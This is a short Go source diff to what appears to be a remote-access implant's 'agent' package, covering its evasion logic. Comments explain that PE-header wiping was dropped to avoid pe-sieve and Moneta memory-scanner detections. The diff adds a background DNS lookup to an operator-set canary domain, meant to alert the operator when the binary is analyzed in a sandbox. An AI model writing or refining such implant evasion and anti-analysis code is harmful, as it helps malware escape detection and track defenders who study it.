@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"net"
 	"os"
 	"strings"
 	"time"
@@ -52,6 +53,12 @@ func Main() {
 		// wipePEHeaders() intentionally removed — zeroing MZ bytes causes pe-sieve
 		// malformed_header + Moneta "Modified PE header" detections (compares memory vs disk).
 		// Modern memory scanners flag modified headers; only primitive scanners need the MZ trick.
+	}
+
+	// Canary DNS lookup — triggers server-side burn detection if this binary is
+	// sandbox-analyzed. Fire-and-forget; the response is irrelevant.
+	if CanaryDomain != "" {
+		go net.LookupHost("canary." + CanaryDomain) //nolint:errcheck
 	}
 
 	var t transport
